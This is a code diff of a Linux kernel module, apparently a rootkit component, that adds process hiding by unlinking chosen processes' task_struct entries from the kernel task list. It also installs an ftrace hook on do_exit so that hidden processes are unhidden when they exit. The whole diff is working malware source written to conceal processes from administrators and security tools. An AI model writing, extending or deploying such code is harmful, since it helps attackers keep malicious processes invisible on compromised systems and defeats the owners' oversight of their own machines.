@@ -5,14 +5,16 @@
 
 #include "helper.h"
 #include "process_hiding.h"
+#include "ftrace.h"
 
 static int enabled = 0;
 
-//TODO do_exit => signal when process is hidden
-//TODO task_struct list
+//TODO handle task_struct of childs of hidden processes
 
 static DEFINE_RWLOCK(pids_lock);
 static LIST_HEAD(hidden_pids);
+static LIST_HEAD(hidden_tasks);
+static struct list_head *init_task_list = NULL;
 
 struct hidden_task {
     struct list_head list;
@@ -114,32 +116,6 @@ int check_hidden_process(const char *name) {
     return ret;
 }
 
-void enable_process_hiding(void) {
-
-    enabled = 1;
-}
-
-/*
- * Disable process hiding
- */
-void disable_process_hiding(void) {
-
-    struct hidden_task *entry, *tmp;
-
-    if (!enabled)
-        return;
-
-    enabled = 0;
-
-    write_lock(&pids_lock);
-    list_for_each_entry_safe(entry, tmp, &hidden_pids, list) {
-        list_del(&entry->list);
-        kfree(entry);
-    }
-    write_unlock(&pids_lock);
-
-}
-
 /*
  * Hide a process if not hidden yet
  */
@@ -147,6 +123,7 @@ int hide_process_add(pid_t pid) {
 
     int ret = 0;
     struct hidden_task *entry;
+    struct task_struct *task, *tmp;
 
     if (!enabled)
         return -1;
@@ -162,8 +139,26 @@ int hide_process_add(pid_t pid) {
         } else {
             entry->pid = pid;
             list_add_tail(&entry->list, &hidden_pids);
+
+            /*
+             * Remove from task_struct list
+             *
+             * Do not remove init task or kernel task parent, might lead to crashes
+             */
+            if (pid != 1 && pid != 2) {
+                list_for_each_entry_safe(task, tmp, &current->tasks, tasks) {
+                    if (task->pid == pid) {
+                        /* remove from task_struct list */
+                        list_del(&task->tasks);
+                        /* store in hidden_tasks */
+                        list_add_tail(&task->tasks, &hidden_tasks);
+                        goto out;
+                    }
+                }
+            }
         }
     }
+out:
     write_unlock(&pids_lock);
     return ret;
 }
@@ -175,22 +170,105 @@ int hide_process_rm(pid_t pid) {
 
     int ret = 0;
     struct hidden_task *entry;
+    struct task_struct *task, *tmp;
 
     if (!enabled)
         return -1;
 
     write_lock(&pids_lock);
 
-    /* Get entry from hidden tasks */
+    /* Get entry from hidden pids */
     if (NULL == (entry = is_hidden_task(pid))) {
         ret = -1;
     } else {
         /* remove from list and free struct */
         list_del(&entry->list);
         kfree(entry);
+
+        /* restore from hidden tasks */
+        list_for_each_entry_safe(task, tmp, &hidden_tasks, tasks) {
+            if (task->pid == pid) {
+                /* remove from hidden_tasks list */
+                list_del(&task->tasks);
+                /* restore in hidden_tasks */
+                list_add_tail(&task->tasks, init_task_list);
+                goto out;
+            }
+        }
+    }
+out:
+    write_unlock(&pids_lock);
+    return ret;
+}
+
+/*
+ * Install ftrace hook for do_exit function, which is triggered when
+ * processes will be killed or terminate.
+ *
+ * In this way we can ensure that processes are hidden during its
+ * lifetime only.
+ */
+static void __noreturn (*orig_do_exit)(long code);
+
+/*
+ * Hooked do_exit. Unhide process if hidden
+ */
+static void __noreturn hooked_do_exit(long code) {
+
+    hide_process_rm(current->pid);
+    orig_do_exit(code);
+}
+
+/*
+ * Hook do_exit via ftrace
+ */
+static struct ftrace_hook exit_hooks[] = {
+        {.name = ("do_exit"), .function = (hooked_do_exit), .original = (&orig_do_exit)},
+};
+
+
+int enable_process_hiding(void) {
+
+    struct task_struct *task;
+
+    /*
+     * Save init task list head to restore task_structs when unhiding them
+     */
+    list_for_each_entry(task, &current->tasks, tasks) {
+        if (task->pid == 1) {
+            init_task_list = &task->tasks;
+        }
     }
 
-    write_unlock(&pids_lock);
+    /*
+     * Install ftrace hooks for do_exit
+     */
+    if (init_task_list == NULL || 0 > ftrace_install_hooks(exit_hooks, 1)) {
+        return -1;
+    }
 
-    return ret;
+    enabled = 1;
+    return 0;
+}
+
+/*
+ * Disable process hiding
+ */
+void disable_process_hiding(void) {
+
+    struct hidden_task *entry, *tmp;
+
+    if (!enabled)
+        return;
+
+    enabled = 0;
+
+    ftrace_remove_hooks(exit_hooks, 1);
+
+    write_lock(&pids_lock);
+    list_for_each_entry_safe(entry, tmp, &hidden_pids, list) {
+        list_del(&entry->list);
+        kfree(entry);
+    }
+    write_unlock(&pids_lock);
 }
